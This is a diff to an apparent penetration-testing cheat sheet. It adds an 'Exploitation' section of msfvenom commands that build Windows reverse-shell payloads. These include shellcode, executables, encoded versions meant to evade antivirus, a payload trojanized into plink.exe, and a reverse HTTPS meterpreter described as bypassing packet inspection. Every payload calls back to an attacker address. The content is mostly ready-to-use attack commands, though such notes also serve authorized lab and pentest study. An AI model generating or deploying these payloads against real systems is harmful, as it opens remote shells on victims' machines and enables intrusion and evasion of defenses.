@@ -241,6 +241,35 @@ Determine which servers are running Windows:
 awk -F "OS: " '/^Nmap/ {a=$0} /OS: Windows/ {print a"\n"FS$2}' <smb-server-list.txt> | grep "Nmap" | cut -d " " -f 5 > smb-servers-running-windows.txt
 ```
 
+
+## Exploitation
+
+### msfvenom
+
+Generate shell code:
+```bash
+msfvenom -p windows/shell_reverse_tcp LHOST=<ip> LPORT=443 -f c –e x86/shikata_ga_nai -b "\x00\x0a\x0d"
+```
+raw Windows PE reverse Meterpreter executable
+```bash
+msfvenom -p windows/shell_reverse_tcp LHOST=<ip> LPORT=4444 -f exe -o shell_reverse.exe
+```
+
+Encoded windows shell
+```bash
+msfvenom -p windows/shell_reverse_tcp LHOST=<ip> LPORT=4444 -f exe -e x86/shikata_ga_nai -i 9 -o shell_reverse_msf_encoded.exe
+```
+
+Encoded and embedded shell
+```bash
+msfvenom -p windows/shell_reverse_tcp LHOST=<ip> LPORT=4444 -f exe -e x86/shikata_ga_nai -i 9 -x /usr/share/windows-binaries/plink.exe -o shell_reverse_msf_encoded_embedded.exe
+```
+
+Reverse HTTPS meterpreter windows reverse shell (encrypted traffic/bypass packet inspection filters)
+```bash
+msfvenom -p windows/meterpreter/reverse_https LHOST=10.11.0.5 LPORT=443 -f exe -o met_https_reverse.exe
+```
+
 > WORK IN PROGRESS
 > WORK IN PROGRESS
 > WORK IN PROGRESS
